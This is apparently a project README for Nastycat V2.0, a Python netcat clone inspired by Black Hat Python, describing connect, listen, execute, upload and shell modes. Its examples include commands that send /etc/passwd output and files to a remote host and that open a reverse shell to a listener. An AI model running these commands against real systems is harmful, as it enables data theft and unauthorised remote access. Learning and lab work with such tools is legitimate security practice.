# Nastycat V2.0

Nastycat is a tool completely made using python for replacing NetCat utility. The first version uses the pwntools framework which is not natively installed with installation of python. But this 2.0 version does not use any libraries that are not preinstalled with python. This allows it to be useful in many situation where the first version would not. Moreover it offers better features than that previous one.

CREDIT - The concept of this tool is from Black Hat Python by Justin Seitz.

## Features

It is very likely to original NetCat.
- It can connect to a server and deliver data on both sides.
- It can also listen for connections on a specific port.

A great feature includes execute mode.
- When specified with listening mode, it executes specified command on local system and starts a server. When someone connects to it, delivers the output.
- Else it will execute the command and send output to the server.

Also includes an upload mode.
- When in listening mode, receives the client output and saves it to the specified file.
- When connected to a server, sends the contents of the specified file to the server.

Now a shell mode is included.
- When enabled with listening mode, activates a server, when a client connects, provides the client access to the server machine's terminal. When client disconnects, repeats the same until it is manually killed.
- When enabled in client mode, invokes an actual reverse shell payload to be sent to the server which allows the server to access the client's terminal.

Note - This is now only supported in linux or linux based operating systems. It does not works as it is supposed to in windows systems.

## Examples

```bash
python3 ./nastycat_v2.py 192.168.3.41 -p 4444 # connect to server at port 4444
```
```bash
python3 ./nastycat_v2.py -l # listens on default port 4444
```
```bash
python3 ./nastycat_v2.py -lp 5555 # listens on port 5555
```
```bash
python3 ./nastycat_v2.py -e "cat /etc/passwd" 192.168.3.41 -p 8080 # sends the output to port 8080
```
```bash
python3 ./nastycat_v2.py -le "cat /etc/passwd" # listens on port 4444 and sends the output when client connects
```
```bash
python3 ./nastycat_v2.py -lu test.txt # receive client data and save it to specified file.
```
```bash
python3 ./nastycat_v2.py -u file.txt 192.168.3.41 -p 8080 # read the file contents and send it to the server.
```
```bash
echo -ne "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n" | python3 ./nastycat_v2.py google.com 80 # same old school method of invoking web requests.
```
```bash
python3 ./nastycat_v2.py -s 192.168.3.41 -p 5555 # sends an actual reverse shell payload to the server. Note - do not works in windows.
```
```bash
python3 ./nastycat_v2.py -ls # starts a server, when a client connects, gets access to the servers terminal.
```

Note - This may require root priviledges.

## Contribution
Any body can voluntarily contribute to this project if he/she has a better idea.
If so, please contact me on my [Insta Handle](https://www.instagram.com/sayanray385/).
